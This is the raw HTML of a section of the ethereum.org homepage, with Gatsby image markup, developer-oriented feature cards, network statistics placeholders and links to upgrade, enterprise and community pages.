                          <div data-gatsby-image-wrapper=""
                            class="gatsby-image-wrapper pages__FeatureImage-sc-179z7qu-19 MDGZx">
                            <div aria-hidden="true" style="padding-top:78.4375%"></div><img aria-hidden="true"
                              data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAD2EAAA9hAHVrK90AAADMElEQVQ4y42SWUiUURTHzzczEVFvvQT1UkJvLVBJmA+5pRLjhkKSFISijdqM4jKOWy4jqeOSWGqLkkkmRWpYiCvmMqipo+OMC6PO5tpopmZ+3zd2OzNaPYxSF/4c7nfO+d3/ufcD2GcpGhnoqqJhsIEBVRsD0wMs6EfNYFSbwYDRoNrRnkuvZLCYxUIWtAqGqxthedjM0yvNPGzmGccwqlku7lEsZ27CDBbNju8D1P0GqliYUdCAwD8OLLK6whwCUSz8H3AHekSroIOwSYAgISoOHSbjPhOVg66LcF86O2Y+gbIcRO0JxNM5s+PbeOK23fQQzaKIdpglMwrGGnUWjbAEHRKEEnR2yeIOgZx9gGZqbmIbx9g+hRDT1CBtxriFMBpBViFsC+MWAhmEnf8XkDM3bgXaaYcZenrQ4nDX3Yh5V39d4rgXd0fe36Hl4lHH8B7bUJ91SrYLD1Aa1IzRqGYn8Tra8Vsn1sjxQU7vPsred6hsJbA6S4CQ7ygC9CY5RBjip1Ot1Q+2LGv6GxcVhtHNGMwdJuvEWkOIkzXuub4tbVqTSwsb1PraD1hZXj+q16/JFb2LpLFqhjS/1pHOZgP7aULpssCuwtjMF6qpswl7ftrCcseGodCogZAXTyGjr5ubWvPu4ILCBHnvW1xb2w0r8vp1MilnNl597Kk4m3DXHvgnwU+axg2S5cHN7GxbYJlpDmrRXVhVBaTKOyDocQE4PpHBtQBvQbhIPPWy6C0pKazUhkRF9d2OFIQGpCWDozge3BPElGdyoi0wX6OGZ6Z5CKssP57W25lw63lJUWBxXkFgbtaAT2zEqldU8IK/NGWEHxt370as8JJP/gORhyTe3iMxATxTEm0fpQfdMShBdaWjsO6NhC9NzeVn3S/xlklLfYtk5b4PZQ1++TllbnFC8JJJ+e7ieNXV0NDLzuER4CoS2QKbEDa/A4ToD3Xgk5MJAY/yIbihGpK+TgONuQyTBq6EhsO5Cw4HQjqawCUqGtwkSZRHerrtyP1k5zdAICeytoZ7PTOF51+cx7tTW8mJGWqhLLlUTR/lLIigzjg4QTfunYQiylWSAh6ZWTa8Xyt/bB7pYwd+AAAAAElFTkSuQmCC"
                              alt="" />
                            <picture>
                              <img class = 'handsome' type="image/webp"
                                data-srcset="/static/754d2f72ce2296fb59d9d974aeda16be/81c4a/future_transparent.webp 750w,/static/754d2f72ce2296fb59d9d974aeda16be/8e128/future_transparent.webp 1080w,/static/754d2f72ce2296fb59d9d974aeda16be/d7e82/future_transparent.webp 1366w,/static/754d2f72ce2296fb59d9d974aeda16be/1e993/future_transparent.webp 1920w"
                                sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                sizes="100vw" decoding="async" loading="lazy"
                                src="https://d33wubrfki0l68.cloudfront.net/ce09f6e33679d2ab726b0bacda798a15dcea5d1b/77658/static/754d2f72ce2296fb59d9d974aeda16be/e2b9b/future_transparent.png"
                                data-srcset="https://d33wubrfki0l68.cloudfront.net/3a42b8ed19338641b3b8c25f8c3e1d601156bfc9/351d6/static/754d2f72ce2296fb59d9d974aeda16be/09337/future_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/8e862fc0fe7d9b07b3873dad746a27be6a8d356d/346ef/static/754d2f72ce2296fb59d9d974aeda16be/69389/future_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/04a526d02fe787b6d29b82ae49df9e6eb646c307/f7b6b/static/754d2f72ce2296fb59d9d974aeda16be/875fc/future_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/ce09f6e33679d2ab726b0bacda798a15dcea5d1b/77658/static/754d2f72ce2296fb59d9d974aeda16be/e2b9b/future_transparent.png 1920w"
                                alt="Illustration of a futuristic computer set up, powered by Ethereum crystals." />
                            </picture><noscript>
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  srcSet="/static/754d2f72ce2296fb59d9d974aeda16be/81c4a/future_transparent.webp 750w,/static/754d2f72ce2296fb59d9d974aeda16be/8e128/future_transparent.webp 1080w,/static/754d2f72ce2296fb59d9d974aeda16be/d7e82/future_transparent.webp 1366w,/static/754d2f72ce2296fb59d9d974aeda16be/1e993/future_transparent.webp 1920w"
                                  sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="100vw" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/ce09f6e33679d2ab726b0bacda798a15dcea5d1b/77658/static/754d2f72ce2296fb59d9d974aeda16be/e2b9b/future_transparent.png"
                                  srcSet="https://d33wubrfki0l68.cloudfront.net/3a42b8ed19338641b3b8c25f8c3e1d601156bfc9/351d6/static/754d2f72ce2296fb59d9d974aeda16be/09337/future_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/8e862fc0fe7d9b07b3873dad746a27be6a8d356d/346ef/static/754d2f72ce2296fb59d9d974aeda16be/69389/future_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/04a526d02fe787b6d29b82ae49df9e6eb646c307/f7b6b/static/754d2f72ce2296fb59d9d974aeda16be/875fc/future_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/ce09f6e33679d2ab726b0bacda798a15dcea5d1b/77658/static/754d2f72ce2296fb59d9d974aeda16be/e2b9b/future_transparent.png 1920w"
                                  alt="Illustration of a futuristic computer set up, powered by Ethereum crystals." />
                              </picture>
                            </noscript>
                            <script
                              type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="pages__DeveloperContainer-sc-179z7qu-25 hXcjPG">
                      <div
                        class="SharedStyledComponents__Content-sc-1cr9zfr-3 pages__CodeExampleContent-sc-179z7qu-7 dedPKg bSqhwG">
                        <div class="TitleCardList__Table-sc-10oh3h-0 eUQUVU pages__StyledCardList-sc-179z7qu-32 gKWMSB">
                          <div class="TitleCardList__TableHeader-sc-10oh3h-1 hHaFmw"><svg stroke="currentColor"
                              fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
                              class="Icon__StyledIcon-sc-1o8zi5s-0 TitleCardList__StyledIcon-sc-10oh3h-2 ilAeZt dZTyOm"
                              height="24" width="24" xmlns="http://www.w3.org/2000/svg">
                              <path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"
                                d="M160 368L32 256l128-112m192 224l128-112-128-112"></path>
                            </svg><span>Code examples</span>
                            <div class="TitleCardList__CodeBoxHeader-sc-10oh3h-13 dqvnkZ">
                              <div class="TitleCardList__Red-sc-10oh3h-10 bUuoBA"></div>
                              <div class="TitleCardList__Yellow-sc-10oh3h-11 iZbXAN"></div>
                              <div class="TitleCardList__Green-sc-10oh3h-12 fQLMwI"></div>
                            </div>
                          </div>
                          <div class="TitleCardList__Item-sc-10oh3h-3 fCFoHG">
                            <div class="TitleCardList__LeftContainer-sc-10oh3h-7 jKPjLU">
                              <div class="TitleCardList__ItemTitle-sc-10oh3h-5 kDCKTc">Your own bank</div>
                              <div class="TitleCardList__ItemDesc-sc-10oh3h-6 eQtyCR">You can build a bank run by logic
                                you&#x27;ve programmed.</div>
                            </div>
                          </div>
                          <div class="TitleCardList__Item-sc-10oh3h-3 fCFoHG">
                            <div class="TitleCardList__LeftContainer-sc-10oh3h-7 jKPjLU">
                              <div class="TitleCardList__ItemTitle-sc-10oh3h-5 kDCKTc">Your own currency</div>
                              <div class="TitleCardList__ItemDesc-sc-10oh3h-6 eQtyCR">You can create tokens that you can
                                transfer and use across applications.</div>
                            </div>
                          </div>
                          <div class="TitleCardList__Item-sc-10oh3h-3 fCFoHG">
                            <div class="TitleCardList__LeftContainer-sc-10oh3h-7 jKPjLU">
                              <div class="TitleCardList__ItemTitle-sc-10oh3h-5 kDCKTc">A JavaScript Ethereum wallet</div>
                              <div class="TitleCardList__ItemDesc-sc-10oh3h-6 eQtyCR">You can use existing languages to
                                interact with Ethereum and other applications.</div>
                            </div>
                          </div>
                          <div class="TitleCardList__Item-sc-10oh3h-3 fCFoHG">
                            <div class="TitleCardList__LeftContainer-sc-10oh3h-7 jKPjLU">
                              <div class="TitleCardList__ItemTitle-sc-10oh3h-5 kDCKTc">An open, permissionless DNS</div>
                              <div class="TitleCardList__ItemDesc-sc-10oh3h-6 eQtyCR">You can reimagine existing services as
                                decentralized, open applications.</div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div
                        class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__FeatureContent-sc-179z7qu-26 bcCiek kuhKTy">
                        <div class="pages__LeftColumnContent-sc-179z7qu-27 eJJieU">
                          <h2 class="pages__StyledH2-sc-179z7qu-31 Ddgiy"><span>A new frontier for development</span></h2>
                          <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>Ethereum and its apps are transparent and
                              open source. You can fork code and re-use functionality others have already built. If you
                              don't want to learn a new language you can just interact with open-sourced code using
                              JavaScript and other existing languages.</span></div>
                          <div class="pages__ButtonRow-sc-179z7qu-5 gIRrJM"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                              href="/en/developers/"><span>Developer portal</span></a></div>
                        </div>
                      </div>
                      <div class="pages__CodeboxModal-sc-179z7qu-8 bFeOvs">
                        <div class="CodeModal__StyledOverlay-sc-15m4x60-0 hgBHBH" style="opacity:0;z-index:-1"></div>
                      </div>
                    </div>
                    <div
                      class="SharedStyledComponents__GrayContainer-sc-1cr9zfr-8 pages__StyledGrayContainer-sc-179z7qu-14 iRRQao iBaFdM">
                      <div
                        class="SharedStyledComponents__Content-sc-1cr9zfr-3 pages__StyledContent-sc-179z7qu-1 dedPKg bCrDps">
                        <h2><span>Ethereum today</span></h2>
                        <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>The latest network statistics</span></div>
                      </div>
                      <div class="StatsBoxGrid__Grid-sc-f5d86h-2 gEKlHk">
                        <div class="StatsBoxGrid__Box-sc-f5d86h-3 izdzbf">
                          <div>
                            <p class="StatsBoxGrid__Title-sc-f5d86h-1 iftUTZ"><span>ETH price (USD)</span></p>
                            <p><span>The latest price for 1 ether. You can buy as little as 0.000000000000000001 – you don't
                                need to buy 1 whole ETH.</span></p>
                          </div><span class="StatsBoxGrid__Value-sc-f5d86h-0 fYaJvI"><span
                              class="StatsBoxGrid__IndicatorSpan-sc-f5d86h-6 iildjv"><span>Loading...</span></span></span>
                        </div>
                        <div class="StatsBoxGrid__Box-sc-f5d86h-3 izdzbf">
                          <div>
                            <p class="StatsBoxGrid__Title-sc-f5d86h-1 iftUTZ"><span>Transactions today</span></p>
                            <p><span>The number of transactions successfully processed on the network in the last 24
                                hours.</span></p>
                          </div><span class="StatsBoxGrid__Value-sc-f5d86h-0 fYaJvI"><span
                              class="StatsBoxGrid__IndicatorSpan-sc-f5d86h-6 iildjv"><span>Loading...</span></span></span>
                        </div>
                        <div class="StatsBoxGrid__Box-sc-f5d86h-3 izdzbf">
                          <div>
                            <p class="StatsBoxGrid__Title-sc-f5d86h-1 iftUTZ"><span>Value locked in DeFi (USD)</span></p>
                            <p><span>The amount of money in decentralized finance (DeFi) applications, the Ethereum digital
                                economy.</span></p>
                          </div><span class="StatsBoxGrid__Value-sc-f5d86h-0 fYaJvI"><span
                              class="StatsBoxGrid__IndicatorSpan-sc-f5d86h-6 iildjv"><span>Loading...</span></span></span>
                        </div>
                        <div class="StatsBoxGrid__Box-sc-f5d86h-3 izdzbf">
                          <div>
                            <p class="StatsBoxGrid__Title-sc-f5d86h-1 iftUTZ"><span>Nodes</span></p>
                            <p><span>Ethereum is run by thousands of volunteers around the globe, known as nodes.</span></p>
                          </div><span class="StatsBoxGrid__Value-sc-f5d86h-0 fYaJvI"><span
                              class="StatsBoxGrid__IndicatorSpan-sc-f5d86h-6 iildjv"><span>Loading...</span></span></span>
                        </div>
                      </div>
                    </div>
                    <div
                      class="SharedStyledComponents__Content-sc-1cr9zfr-3 pages__StyledContent-sc-179z7qu-1 dedPKg bCrDps">
                      <h2><span>Explore ethereum.org</span></h2>
                    </div>
                    <div
                      class="SharedStyledComponents__Content-sc-1cr9zfr-3 pages__StyledContent-sc-179z7qu-1 dedPKg bCrDps">
                      <div
                        class="SharedStyledComponents__CardContainer-sc-1cr9zfr-14 pages__StyledCardContainer-sc-179z7qu-17 eOjDVk kTUIwR">
                        <a class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__Tout-sc-179z7qu-16 jNrXCG"
                          href="/en/upgrades/">
                          <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                            <div data-gatsby-image-wrapper="" style="width:320px;height:241px"
                              class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAAETklEQVQ4y2WUe0ybVRTATwtB4yNm+oca/9C5xGiyLVMTp4uRyCJq8JkYwuLMfGQG4yBsY5ZH5d0hr9Ku9N0P+gRaXi2Flr77fV/7FfocUB5jEhjdGE55yMaQwriWRqPTm5x7zs0955dzb845gBCCPdmOb8PO7m7SNly7Azo1P7UlFoO9ZdFLj3QasH0hgwoO3+iHgl9G6coxf2ofSdAH3G5Ad7eSfgEnCfA3MCmrt6GddKSMNLEBAdC1LuvZ7sAw2+DFe/UOW1blsGUvAKpWroB8LABahx0yE+c2j4v+NZpP3iVB3TwZ4JmnoX75Kl3mde3BoIfAP1RTREQV9vk0l/1+bTQc1U1ERnXRMNk5FuxuD/rK9Dh+LB0tgZJwgehKmJ4EbiW2mffyoA7doWELU9BF4tltAc+sLOK7Kw1TSxI/MSsLeaKSAOEXB4g5LORdwwLkgjTk3ZCFKSQfIa/qCTxDNRmGhth4AroZB/3cVErzKAVdPk8+FqLiohF8UeAw++Sks0XpI7QKnFBjdjcmGbQ4JU67OZG5RufFVW0u2yWhz6XHAh6kpzyfykf9AAq3nd5JukFLuDKEARJJBwyfYS6bSmAZsGvadU3mftPbQWdNlkNzCXNgrbrQYP1xox0/qvQP5ygod6fCNsQU28154kRsn8PxEoi8zlQeaQOhx17BcZhmBHaTr8VirGzU9ULwTNeLNt4PMVKVs+hqO4ccku/jDvmpZafwtFme8dUL49mF+7ndnUOJGDvHZZ4TuC250DKopzeb9MAzG47W9LQbOcYebolS2p5bxTg+Yh6VUn0UspfmvKNmOqYG+dHr3ZXfCoyiDuQfwEuLeOwTTKW0v6lXy73Y19kvNBkOQJZbC3m6NnqhXg0XtaoMplwiYEj4VJGYc08ucCJf38ymVSodwYo8O12c+W2rSDlpEka2dV3UVn4za7VAJu0qVmGNtR2KV1iGjn/qsJmwpJxXSkAolz9czOe9f0bAKudXDMx2sCKotcGJWhg4EhZTSMyyInnxMBI32qIF3LLcvopv6sNlXx4qaK0F5OTS7itsSD9MS+jUhKTV8a2gawqVaVheJCnpLdDWU6eMvMA5EUP7uaZuGOmbIl9A1cnnsuuYsYOc2o1neezBEK81LQnaTbRcbPlXuPX7GgyRBOjcRNr8zTiQMzfetU5f+5G4vX5ALAtBYzUBA+u39pl+XmhYW9k58oyA3fNI80/oierSuf015ba8Rs7j92W4+1cv+9c2acH1OPhXNg5Zl1azmMHxxxBMwKrkD1q6bvBBxdzNzFmEnnqNVfXyx8zStxJvo8GkFT6qroH/wVBCq2YWoNA/DaXB6UeZvuiTn3DVKZBzAgyRxaQPlxp76DsL/sDrHDa8UcwA+dMHk338QUXlf4bDv/9TkRgE3TgNsvNpMPUbwPV7UEoE4ezIOLAvT9MndhA8X1ZCe7OynH7swnl4lXEBvBo9/An3NdC4oOkhKQAAAABJRU5ErkJggg=="
                                alt="" />
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  data-srcset="/static/5d3af9eb308978e7a078bf51022d8a5c/5ac64/merge.webp 320w,/static/5d3af9eb308978e7a078bf51022d8a5c/91d84/merge.webp 640w"
                                  sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="320px" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/cbab9ec631e757ccb760f5ad5f9dc886038fe5d6/aad73/static/5d3af9eb308978e7a078bf51022d8a5c/6e8b5/merge.png"
                                  data-srcset="https://d33wubrfki0l68.cloudfront.net/cbab9ec631e757ccb760f5ad5f9dc886038fe5d6/aad73/static/5d3af9eb308978e7a078bf51022d8a5c/6e8b5/merge.png 320w,https://d33wubrfki0l68.cloudfront.net/d4017a532ac793fdfa5a3ccf13bdfd19afd72826/35c34/static/5d3af9eb308978e7a078bf51022d8a5c/b65ef/merge.png 640w"
                                  alt="Illustration of a spaceship representing the increased power after Ethereum upgrades." />
                              </picture><noscript>
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    srcSet="/static/5d3af9eb308978e7a078bf51022d8a5c/5ac64/merge.webp 320w,/static/5d3af9eb308978e7a078bf51022d8a5c/91d84/merge.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/cbab9ec631e757ccb760f5ad5f9dc886038fe5d6/aad73/static/5d3af9eb308978e7a078bf51022d8a5c/6e8b5/merge.png"
                                    srcSet="https://d33wubrfki0l68.cloudfront.net/cbab9ec631e757ccb760f5ad5f9dc886038fe5d6/aad73/static/5d3af9eb308978e7a078bf51022d8a5c/6e8b5/merge.png 320w,https://d33wubrfki0l68.cloudfront.net/d4017a532ac793fdfa5a3ccf13bdfd19afd72826/35c34/static/5d3af9eb308978e7a078bf51022d8a5c/b65ef/merge.png 640w"
                                    alt="Illustration of a spaceship representing the increased power after Ethereum upgrades." />
                                </picture>
                              </noscript>
                              <script
                                type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                            </div>
                          </div>
                          <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                            <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Level up your upgrade knowledge</h3>
                            <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">Ethereum consists of interconnected
                              upgrades designed to make the network more scalable, secure, and sustainable.</p>
                          </div>
                        </a><a
                          class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__Tout-sc-179z7qu-16 jNrXCG"
                          href="/en/enterprise/">
                          <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                            <div data-gatsby-image-wrapper="" style="width:320px;height:350px"
                              class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAD2EAAA9hAHVrK90AAAFXklEQVQ4y8WVe0zTVxTHD4gadIv7R5NpotuyREeMMSZuM9lE3aAv2kKLtIA/nrblVV7aB4+WlpdAeehAQEFh8h4VoQXGUBBFBfExFZ1QZFE2Mw0+QNzUPu5ZW8yM2/5cspt8c/K7v9/95HvOPff+AP6vsWbNali+fDmsXPk+rFq1yjmHiODh8cm/LxgnxBmzVMmglseAWhHrok2NX6BJkb6RMs4tMy3eLTk6wi1CKFggpoJdQwN2QkSgACKDhBDo5wtA91fC11wZ8CI14O2b7hqV1eCaUlzvdkXvD9/kREOxJhJ0qnDITaGgQB0FGtVeEAaFA5cTDEJhJGzyigVVdCAoREHQk8sFaOk+D5fGJx32XTw2xgFfXAGy3Bo42UwtK8mO8SnUSvwKNOLgPPVuUUFGXHyWWqakdoWqeNygcEFA2LZ1W8KWRokjQS4SuDSp2QC1+j5o6TntrMfaDeKNgTEHvBILO+nhYcntMZIklIj3oFi0F3eL5EhRESgNZWBhIg8zo3mo3M3HhBDfRpmQA/BRBWRKGPOFdYyW7pGvFHmtc5V9lzHPeB3DVEYM1XaT8Oxem6Sw37pff9bKDc23qMJoZtMhf/OZfVzrYL6vbVDHxy4NRzFRRcHdGsrVCZxD1Nx+8AQP9V0lnbOPSd3d+7bikZu27N4hknNyiBSd+5EcH7tFqMRiEhEpIf05PqQ2nkbqk2jWxmRvPChl3YVP1QvXMaUAxA6cRWwbn55BXe8Nc+3kFGkx/UIaR38mh7pGsNwwTCoNF3F/Qx8yxPnI2UVhVwYLjytYxJjOtp1QMjBPRH+4nhbt7smOmAfO2GwNE8+eY/XoPUvNxD1sHpsizZP3sebibSw1DOHBjiEsqXMAdcij5oGtciYa0tg2QyoLC8T0hx94itw/o4fM13CWkKbbs8+xdMhkOeoAjk9h3fU7eGRwFEuNw1hmBxYfO4V0kQMY8hawI5WJOgljej09xn0bJ/K1QzvwzswcFvfftJRfG8P6yyasv2LCqt6rjpSx0jCCZfqzyI3OR9+QUOxSM/8GZD7ezJEu8eKJXjtEbPzpwSM8OnzdbHj6hNRN3CNlF0cx13iW7OsaxLzvz2OLyYQRqUdwp38IdqoZb4ApTCyMYj3Zyo97hyWQANgcDpG0mp7OYVHrAFZduoEHLozaEmt6SEJND9pF4ivbUF5Uh7zANJSFU9ih5qBeznAAiQOoi/L5wz8g9GOBMBxgxmqFabOlfNpqm7n1cPpXbVPXi4N6A7YZO4jeaMBWhzra8Vh1FWYo92CuSontGX5OoH2XidGRchT7JYcbsIHPDwKwmF/C1NyzhfbUF1/+7dp7O7TZ/t9W6bpPVOdgbWmWuak8y/pdZaa11a4ybby1QhNj7dJwSfMemq0thWXVy2m2gmiO1c9XsDFgZzDAi1cv4ZHZ7KylU+c0MFrms6XTvpOyYB88HOeNdYle6GjghmQ69mZxcLDAz/5Mw+a9dHs/MrA6kT3httZn6YpNPIBnVgs8sljsvUhg7Eq7y0wPzQ7ucxvQ8c+kh7MvVcTRzxyWel84mkAftsNHGmWMa0Ml/N+PK5kzegVzslXBulGX5C3v0AjhdH6Ii/Mcf5EQC5s16VBbEAZAyeBYbiQ0prIXxQ44XP/w13mfj4vdmlNpH2qDPn8v0NNjoTOrAQoOKMRQlaN8+5KtT2PBfnWgfeFq6NCyIXvdPy/iRe+uAIOWBaViT1AJt9hn3AH7pc53S5atePvj4TIBvBqQAt5Uwsl9fpBGeUF26HZID/oSMqmtoLbHIvF2aM9gulREb3epS6LBEak3lIh2wCkNGy7k+v73/54/AUaEKKCt+fV1AAAAAElFTkSuQmCC"
                                alt="" />
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  data-srcset="/static/a44134e541c72364beb121234ab5864e/f341f/infrastructure_transparent.webp 320w,/static/a44134e541c72364beb121234ab5864e/3bd4a/infrastructure_transparent.webp 640w"
                                  sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="320px" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/567bbc617c7eb3daa1d2815e307ee91ef731eb6c/472ae/static/a44134e541c72364beb121234ab5864e/2ded0/infrastructure_transparent.png"
                                  data-srcset="https://d33wubrfki0l68.cloudfront.net/567bbc617c7eb3daa1d2815e307ee91ef731eb6c/472ae/static/a44134e541c72364beb121234ab5864e/2ded0/infrastructure_transparent.png 320w,https://d33wubrfki0l68.cloudfront.net/27665d71ef9f01f201b3e41173a763a93fbd21cc/530e6/static/a44134e541c72364beb121234ab5864e/594e9/infrastructure_transparent.png 640w"
                                  alt="Illustration of a futuristic computer/device." />
                              </picture><noscript>
                                <picture>
                                  <img class = 'handsome' type="image/webp"
                                    srcSet="/static/a44134e541c72364beb121234ab5864e/f341f/infrastructure_transparent.webp 320w,/static/a44134e541c72364beb121234ab5864e/3bd4a/infrastructure_transparent.webp 640w"
                                    sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                    sizes="320px" decoding="async" loading="lazy"
                                    src="https://d33wubrfki0l68.cloudfront.net/567bbc617c7eb3daa1d2815e307ee91ef731eb6c/472ae/static/a44134e541c72364beb121234ab5864e/2ded0/infrastructure_transparent.png"
                                    srcSet="https://d33wubrfki0l68.cloudfront.net/567bbc617c7eb3daa1d2815e307ee91ef731eb6c/472ae/static/a44134e541c72364beb121234ab5864e/2ded0/infrastructure_transparent.png 320w,https://d33wubrfki0l68.cloudfront.net/27665d71ef9f01f201b3e41173a763a93fbd21cc/530e6/static/a44134e541c72364beb121234ab5864e/594e9/infrastructure_transparent.png 640w"
                                    alt="Illustration of a futuristic computer/device." />
                                </picture>
                              </noscript>
                              <script
                                type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                            </div>
                          </div>
                          <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                            <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Ethereum for enterprise</h3>
                            <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">See how Ethereum can open up new business
                              models, reduce your costs and future-proof your business.</p>
                          </div>
                        </a><a
                          class="Link__InternalLink-sc-e3riao-1 hoRTos ActionCard__Card-sc-gy4g5e-6 jZiAML pages__Tout-sc-179z7qu-16 jNrXCG"
                          href="/en/community/">
                          <div class="ActionCard__ImageWrapper-sc-gy4g5e-3 cLArJv action-card-image-wrapper">
                            <div data-gatsby-image-wrapper="" style="width:320px;height:219px"
                              class="gatsby-image-wrapper ActionCard__Image-sc-gy4g5e-5 cIcvKa"><img aria-hidden="true"
                                data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAC4jAAAuIwF4pT92AAAEHElEQVQ4yy1UWU8bBxAeEzWqqqgSb1WT/oI+tGqVqu1bxUufIyVV8lC1Uqv2IagVLUJpSERCRJICoUm1uBhICHZMgvGu1zbGYGwC5tjYhnDalMMmvtfHetdrr4+1PcVJR/qkGY30aeabA+DYfr24BaO9Aoz2ZEF5I6lQdSUbzn+1BqdgFRARvvli792SXHvt16HrPgB53gA5Gw0+jbHBp6EVSTMNqUka/rfLr8nU98Q6IQx0psA9Jzc4LQVwGHOXXM8lyfIs/dkszYOdFhoQN4G3kJA2kwrfYxJ2RylIGikFN0kB9AzFoGcwBn29rKIRddDfyZ7u70icHRtbbdg/EMBB88OxcAGfT3F/RYMSJOPFE4h+SNCkIk6RsDNCfbz5yPBhitLDMRRwsy8I7df8CoBm0Ook0PSIpvGBLKpH4u9blNzFFUrEeESqMoZcluxLfmp6wIF96PDEwxYKur/VvxMwTIWitOlIc5l8e6Z9HODa7QBc6fTDH9cDjV2qyHfqIc47+UTE4T728w2baN5dzOOqNVvwUAVcnRI0m7YcbBv/Pbn7aBy8I/qPjihrYY+ewRcDuq+9T0mAcWf+hG4pD/3jqXvkkojkQhaH1Qlb0yeOU7456QEzLVbXbFJlYzqPjDFjWNJnQDyMnzR36GCFmDxrnF+v0nsRXHAf3XKFUgA//B6A71uDjSqLGNE6RNQ4ctUJpyg/meH2n43xNuoxJznUXNWll3BSlbjEeuT6FBWvUhJQ06FzHlHCPbmEPl5y1DcAevU5uK8TmpTWIhLWYqXfnK+paB4fT3EVg1XEaU0KZ7WhyqJOwulR/ukrX+YyG80vxML5P/XzCbN1R8RZr4juoJCxv0x9AD/djJ25Ncpv9VsKqLKXKyqTgPefcftqdaA5dFiKM88lVL8Uq3MTKdxdzOB6qMQnElnEbAmNC5niz9pErZcUcGqZZx+Oh09D29/pL6+oBLw+xJdua7O1q/+k8Wp/UlY+ZZMOplg92BZxwxOsbTuPauweV/MEJdRmRHk2LlapCI/3haw8KIj4YCttN9dbBrgAbQSn69BK2K4u1FqH8uXWYanSQuTwxztZmTQn5MAeKx/GBNm9kinPmgJl5+aWbIjmyipfptwT5